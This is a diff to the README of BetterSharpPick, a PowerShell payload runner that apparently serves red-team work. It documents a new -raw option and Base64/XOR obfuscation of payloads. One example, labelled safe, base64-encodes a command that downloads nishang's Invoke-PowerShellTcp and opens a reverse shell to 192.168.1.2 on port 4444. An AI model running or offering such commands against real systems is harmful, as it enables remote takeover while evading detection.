@@ -51,8 +51,11 @@ BetterSharpPick.exe [options]
     
 - `xor <0-255>`
     
-    Single decimal byte key. **Applies only to `-path` payloads** (files/URLs). **Does not** apply to `-c` or `--arg`.
+    Single decimal byte key. **Applies only to `-path` payloads** (files/URLs). **Does not** apply to `-c` or `-arg`.
+
+- `raw`
     
+    Treat -path payload as raw (no Base64/XOR).
 
 ### Decoding rules
 
@@ -63,9 +66,13 @@ BetterSharpPick.exe [options]
     
 - **Scope of `xor`:**
     - `xor` affects **only** the payload read via `path` (file/URL). It does **not** touch `c` or `-arg`.
+
+- **Scope of `raw`:**
+    - `raw` guarantees the -path content is treated as raw; no Base64/XOR is applied.
+
 - **Order when both apply to `path`:**
     
-    If you place `-b64` before `-path` **and** also supply `-xor`, decoding proceeds as: **Base64 decode → XOR decode** of the payload bytes.
+    If you place `-b64` **and** also supply `-xor`, decoding proceeds as: **Base64 decode → XOR decode** of the payload bytes.
     
 
 ## Examples (safe, illustrative)
@@ -95,12 +102,12 @@ Base64-encoded **inline** command (scope `-b64` to `-c`):
 BetterSharpPick.exe -b64 -c V3JpdGUtSG9zdCAnSGVsbG8gV29ybGQn
 ```
 
-Base64-encoded **argument** (scope `-b64` to each `--arg` you want decoded):
+Base64-encoded **argument** (scope `-b64` to each `-arg` you want decoded):
 
 ```bash
-# --arg "Hello"  -> SGVsbG8=
-# --arg "World!" -> V29ybGQh
-BetterSharpPick.exe --arg PlainText -b64 --arg SGVsbG8= -b64 --arg V29ybGQh
+# -path "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1"
+# -arg "Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.2 -Port 4444"
+BetterSharpPick.exe -b64 -path aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcvbWFzdGVyL1NoZWxscy9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczE= -arg SW52b2tlLVBvd2VyU2hlbGxUY3AgLVJldmVyc2UgLUlQQWRkcmVzcyAxOTIuMTY4LjEuMiAtUG9ydCA0NDQ0 -raw
 ```
 
 Base64 on the **payload** + XOR on the **payload** (XOR applies only to `-path`):
@@ -113,14 +120,14 @@ BetterSharpPick.exe -xor 140 -b64 -path aHR0cHM6Ly9leGFtcGxlLmNvbS9wYXlsb2FkLnBz
 No Base64 anywhere if `-b64` is not placed before an option:
 
 ```bash
-BetterSharpPick.exe -path .\plain.ps1 --arg simple --arg values
+BetterSharpPick.exe -path .\plain.ps1 -arg simple
 ```
 
 ## Built-in Help (CLI)
 
 ```
 USAGE:
-  BetterSharpPick [-xor <0-255>] [-path <file-or-url>] [-c <text>] [--arg <string>] [-b64]
+  BetterSharpPick [-xor <0-255>] [-path <file-or-url>] [-c <text>] [-arg <string>] [-b64] [-raw]
 
 DESCRIPTION:
   -path <value>   : Payload file path or URL.
@@ -128,17 +135,21 @@ DESCRIPTION:
   -arg <string>  : Argument to pass (repeatable).
 
   -b64            : Scoped base64. Applies ONLY to the NEXT option’s value.
-                    Put -b64 directly before -path, -c, or --arg if that value is base64-encoded.
+                    Put -b64 directly before -path, -c, or -arg if that value is base64-encoded.
                     If -b64 is not used in front of an option, no base64 is expected for that option.
 
   -xor <0-255>    : Single decimal byte key. Applies ONLY to payloads from -path (file/URL).
-                    Does NOT apply to -c or --arg.
+                    Does NOT apply to -c or -arg.
                     If used together with -b64 (scoped to -path), decoding order is: Base64 → XOR.
+  
+  -raw     : Affects only the payload content read via -path.
+                    Treat the -path payload as RAW text; Do NOT apply Base64/XOR.
+                    Does not affect -c or -arg.
 
 EXAMPLES:
   BetterSharpPick -path https://example.com/file.ps1
   BetterSharpPick -b64 -c V3JpdGUtSG9zdCAnSGVsbG8n
-  BetterSharpPick -b64 --arg UGFyYW0x -b64 --arg UGFyYW0y
+  BetterSharpPick -b64 -arg UGFyYW0x -b64 -arg UGFyYW0y
   BetterSharpPick -xor 140 -b64 -path aHR0cHM6Ly9leGFtcGxlLmNvbS9maWxlLnBzMQ==
 ```
 
